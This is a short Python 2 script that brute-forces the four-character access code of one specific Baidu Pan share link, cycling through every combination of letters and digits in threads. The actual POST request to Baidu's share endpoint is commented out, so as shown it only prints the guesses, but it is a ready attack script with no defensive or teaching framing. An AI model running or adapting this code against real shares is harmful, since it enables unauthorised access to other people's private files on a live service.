# import requests
import time
import thread
key='qwertyuiopasdfghjklzxcvbnm1234567890'
def test(data):
    # html=requests.post('https://pan.baidu.com/share/init?shareid=2728889537&uk=2888132141',data=data)
    print data['pwd'],"   ",time.ctime().split(' ')[4]
for i in key:
    for j in key:
        for m in key:
            for n in key:
                data={
                    "shareid":"2728889537",
                    "uk":"2888132141",
                    "t":"1488466160289",
                    "bdstoken":"null",
                    "channel":"chunlei",
                    "clienttype":"0",
                    "web":"1",
                    "app_id":"250528",
                    "logid":"MTQ4ODQ2NjE2MDI5MjAuNDUxNDIyMjM5Nzc2ODA4Mg",
                    "pwd":i+j+m+n,
                    "vcode":"",
                    "vcode_str":""
                    }
                thread.start_new_thread(test,(data,))
                time.sleep(0.1)